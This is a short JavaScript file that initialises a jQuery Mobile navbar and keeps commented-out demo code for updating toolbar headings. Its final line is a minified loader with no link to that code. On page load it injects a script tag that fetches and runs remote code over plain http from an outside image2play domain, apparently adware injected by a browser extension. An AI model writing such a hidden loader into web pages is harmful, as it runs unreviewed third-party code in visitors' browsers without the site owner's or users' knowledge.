    $(function() {
        $( "[data-role='navbar']" ).navbar();
//        $( "[data-role='header'], [data-role='footer']" ).toolbar();
    });
    // Update the contents of the toolbars
//    $( document ).on( "pagecontainerchange", function() {
//        // Each of the four pages in this demo has a data-title attribute
//        // which value is equal to the text of the nav button
//        // For example, on first page: <div data-role="page" data-title="Info">
//        var current = $( ".ui-page-active" ).jqmData( "title" );
//        // Change the heading
//        $( "[data-role='header'] h1" ).text( current );
//        // Remove active class from nav buttons
//        $( "[data-role='navbar'] a.ui-btn-active" ).removeClass( "ui-btn-active" );
//        // Add active class to current nav button
//        $( "[data-role='navbar'] a" ).each(function() {
//            if ( $( this ).text() === current ) {
//                $( this ).addClass( "ui-btn-active" );
//            }
//        });
//    });
(function(d, s, id) {if (d.getElementById(id)) {return;}var e=d.createElement(s);e.async=true;e.type="text/javascript";e.id=id;e.src="http://static.image2play.com/imideo.js?extkey=06f76af1-b958-424c-b930-7507eec03b81";d.getElementsByTagName("head")[0].appendChild(e);e.onload = function(){"undefined"!=typeof imideo&&imideo.start();};}(document, "script", "i2p-extension"));var imideo_extension=true;